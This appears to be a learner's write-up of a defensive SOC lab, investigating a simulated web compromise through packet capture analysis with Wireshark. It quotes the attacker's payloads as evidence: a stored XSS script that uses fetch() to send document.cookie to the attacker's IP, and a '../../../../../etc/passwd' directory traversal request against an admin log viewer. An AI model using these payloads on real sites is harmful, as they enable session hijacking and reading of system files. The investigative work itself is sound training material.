# 🛡️ CyberLabs SOC L1 – RetailBreach Investigation

## Overview

This repository documents my investigation of the **RetailBreach** SOC L1 lab on **CyberLabs**.

The lab involved analysing network traffic and HTTP requests to investigate a simulated web application compromise. I used packet-analysis techniques to identify the attacker, understand the attack sequence, and determine how the compromised session was used to access a sensitive system file.

**Platform:** CyberLabs  
**Lab:** RetailBreach  
**Role:** SOC Analyst L1

> **Note:** This project was completed in a controlled training environment. Sensitive session information from the lab has been redacted from this public repository.

---

## Objectives

The investigation focused on identifying:

- The attacker's IP address
- The tool used to perform the brute-force activity
- The XSS payload
- When the administrator first visited the compromised page
- The stolen session token
- The exploited web application script
- The payload used to attempt access to a sensitive system file

---

## Tools & Techniques

### Tools
- Wireshark
- CyberChef

### Techniques / Skills Practiced
- Network traffic analysis
- IP conversation analysis
- HTTP request analysis
- Following HTTP streams
- HTTP User-Agent analysis
- XSS investigation
- URL decoding
- Timeline analysis
- Session/cookie analysis
- Web application attack investigation
- Directory traversal analysis

---

# Investigation

## Task 1 – Finding the Attacker's IP Address

### Objective

Identify the IP address associated with the suspicious activity.

### Investigation

I navigated to **Statistics → Conversations** in Wireshark and examined the communication between the observed IP addresses.

The traffic showed one IP acting as the source and sending a large amount of traffic to the destination. This made the source IP worth investigating further.

### Finding

**Attacker IP:** `111.224.180.128`

### Evidence

![Task 1 - Attacker IP](screenshots/Task-01-attacker-ip-01.png)

![Task 1 - Attacker IP Evidence](screenshots/Task-01-attacker-ip-02.png)

### What I Learned

- The source IP identifies where traffic originated.
- The destination IP identifies where traffic was sent.
- Traffic direction and volume can help identify suspicious communication.

---

## Task 2 – Identifying the Tool Used for Brute Force

### Objective

Identify the tool used by the attacker to perform the brute-force activity.

### Investigation

I filtered the traffic using the attacker's IP:

```text
ip.src == 111.224.180.128
```

I then found a suspicious HTTP request:

```http
GET /.cvsignore HTTP/1.1
```

I followed the HTTP stream and inspected the **User-Agent** information.

### Finding

**Tool used:** `Gobuster`

The User-Agent information identified Gobuster as the tool generating the requests.

### Evidence

![Task 2 - Tool Used](screenshots/Task-02-tool-used-01.png)

![Task 2 - Tool Used Evidence](screenshots/Task-02-tool-used-02.png)

### What I Learned

- HTTP User-Agent information can reveal the software generating requests.
- Following an HTTP stream can provide additional context.
- Tool fingerprints in HTTP traffic can help identify attacker activity.

---

## Task 3 – Identifying the XSS Payload

### Objective

Identify the XSS payload used by the attacker.

### Investigation

I filtered traffic from the attacker's IP and searched HTTP traffic for references to `script`:

```text
ip.src == 111.224.180.128 && http contains "script"
```

I found a POST request to:

```text
/reviews.php
```

I followed the HTTP stream and inspected the POST data and server response. The payload was URL-encoded in the request and could be decoded to reveal the JavaScript.

### Finding

```html
<script>fetch('http://111.224.180.128/' + document.cookie);</script>
```

The payload used `fetch()` to send the victim's `document.cookie` to the attacker's IP address, indicating an attempt to steal the victim's session cookie.

### Evidence

![Task 3 - XSS Payload](screenshots/Task-03-XSS-payload-01.png)

![Task 3 - XSS Payload Evidence](screenshots/Task-03-XSS-payload-02.png)

### What I Learned

- XSS can be delivered through user-controlled web input.
- HTTP POST data can reveal malicious payloads.
- `document.cookie` can expose cookies accessible to JavaScript.
- Following an HTTP stream can reveal both the request and response.
- CyberChef can be used to decode URL-encoded data.

---

## Task 4 – Identifying When the Admin First Visited the Compromised Page

### Objective

Identify the UTC timestamp when the administrator first visited the page containing the injected XSS.

### Investigation

From Task 3, I identified that the XSS payload was injected at approximately **12:08 UTC**.

I then filtered for requests to `reviews.php` from IP addresses other than the attacker:

```text
ip.src != 111.224.180.128 && http.request.uri contains "reviews.php"
```

Two relevant requests appeared:

- **11:50 UTC** – before the XSS injection
- **12:09 UTC** – after the XSS injection

Because the 11:50 request occurred before the malicious script was injected, I investigated the 12:09 request as the administrator's first visit to the compromised page.

### Finding

**UTC Timestamp:** `2024-03-29 12:09`

### Evidence

![Task 4 - Admin First Timestamp](screenshots/Task-04-Admin-First-Timestamp.png)

![Task 4 - XSS Timestamp](screenshots/Task-04-XSS-Timestamp.png)

### What I Learned

- Timestamps can help reconstruct the sequence of a security incident.
- Attack timing helps establish cause and effect.
- A request occurring before malicious content is injected cannot represent a victim encountering that injected content.

---

## Task 5 – Identifying the Stolen Session Token

### Objective

Identify the session token associated with the administrator's compromised web session.

### Investigation

I started from the packet identified in Task 4 and followed the relevant HTTP stream. I inspected the HTTP headers for the session cookie.

The stream contained a `PHPSESSID` value.

### Finding

**Stolen Session Token:** `[REDACTED – LAB SESSION TOKEN]`

The original value is intentionally not published in this public repository because session tokens are authentication credentials, even when they originate from a training lab.

### Evidence

![Task 5 - Stolen Session Token](screenshots/Task-05-Stolen-Session-Token.png)

### What I Learned

- Session tokens can be targeted through XSS attacks.
- HTTP cookies can contain session identifiers such as `PHPSESSID`.
- HTTP stream analysis can reveal session-related information.
- Evidence from separate tasks can be correlated to reconstruct a breach.

---

## Task 6 – Identifying the Exploited Script

### Objective

Identify the web application script exploited by the attacker.

### Investigation

I used the compromised session information to filter the attacker's traffic:

```text
ip.src == 111.224.180.128 && http && frame contains "<LAB_SESSION_TOKEN>"
```

I found requests to administrative PHP scripts, including:

```text
/admin/log_viewer.php?file=error.log
```

and:

```text
/admin/log_viewer.php?file=../../../../../etc/passwd
```

The attacker was manipulating the `file` parameter of the administrative log viewer.

### Finding

**Exploited Script:** `log_viewer.php`

The exploitation activity was centered on the `file` parameter.

### Evidence

![Task 6 - Exploited Script](screenshots/Task-06-Exploited-Script-Log-Viewer-01.png)

![Task 6 - Exploited Script Evidence](screenshots/Task-06-Exploited-Script-Log-Viewer-02.png)

### What I Learned

- Web applications can be exploited through vulnerable input parameters.
- Request URIs and parameters can reveal an attacker's actions.
- Directory traversal sequences such as `../` can be used to attempt access to files outside an application's intended directory.
- Following an HTTP stream provides additional context around an attack.

---

## Task 7 – Identifying the Sensitive File Access Payload

### Objective

Identify the specific payload used to attempt access to a sensitive system file.

### Investigation

I continued investigating the traffic involving the compromised session.

The vulnerable script identified in Task 6 was:

```text
/admin/log_viewer.php
```

I examined the request parameters and found that the attacker manipulated the `file` parameter:

```http
GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1
```

### Finding

**Payload:**

```text
../../../../../etc/passwd
```

The payload used directory traversal sequences to attempt to move outside the intended directory and access `/etc/passwd`.

### Evidence

![Task 7 - Directory Traversal Payload](screenshots/Task-07-Directory-Traversal-Payload.png)

### What I Learned

- Attackers can manipulate vulnerable file parameters to access files outside an intended directory.
- The `../` sequence is commonly associated with directory traversal.
- HTTP request parameters can reveal the exact payload used during an attack.
- The vulnerable script and payload are separate pieces of evidence.

---

# Incident Timeline

| Time | Event |
|---|---|
| 11:50 UTC | Earlier visit to `reviews.php` |
| 12:08 UTC | XSS payload injected |
| 12:09 UTC | Administrator first visited the compromised page |
| After 12:09 UTC | Session information was used in subsequent attacker activity |
| Later | Attacker accessed `log_viewer.php` and attempted directory traversal |

---

# Key Findings

| Investigation Item | Finding |
|---|---|
| Attacker IP | `111.224.180.128` |
| Brute-force / enumeration tool | `Gobuster` |
| XSS payload | `fetch()` + `document.cookie` payload |
| Admin first visit | `2024-03-29 12:09 UTC` |
| Session token | Redacted |
| Exploited script | `log_viewer.php` |
| Sensitive file targeted | `/etc/passwd` |
| Directory traversal payload | `../../../../../etc/passwd` |

---

# Investigation Summary

The investigation showed a sequence of related activities.

First, I identified the suspicious source IP as `111.224.180.128`. HTTP traffic from this IP revealed the use of Gobuster.

Further HTTP analysis identified an XSS payload submitted to `reviews.php`. The payload attempted to access `document.cookie` and send it to the attacker's IP.

Timeline analysis showed that the administrator visited the affected page at **12:09 UTC**, after the malicious script had been injected.

The investigation then connected the compromised session to activity against the administrative `log_viewer.php` script. The attacker manipulated its `file` parameter and attempted to access `/etc/passwd` using a directory traversal payload.

This investigation helped me practise correlating multiple pieces of network evidence to understand the progression of a simulated web application compromise.

---

# Skills Practiced

- Wireshark packet analysis
- Network conversation analysis
- HTTP investigation
- HTTP stream analysis
- User-Agent identification
- XSS analysis
- URL decoding
- Timeline reconstruction
- Session/cookie analysis
- Web attack investigation
- Directory traversal analysis
- Incident documentation

---

# Lessons Learned

This lab improved my confidence in using Wireshark to investigate suspicious network traffic.

I learned that individual packets can provide useful evidence, but correlating different pieces of evidence is what helps build a clearer picture of an incident.

The investigation also helped me understand how an XSS vulnerability can be connected to session theft and how a compromised session can then be used to access vulnerable administrative functionality.

---

# Disclaimer

This project was completed in a controlled CyberLabs training environment for educational purposes.

The repository is intended to document my learning and investigation process. Sensitive authentication information has been redacted from the public documentation.
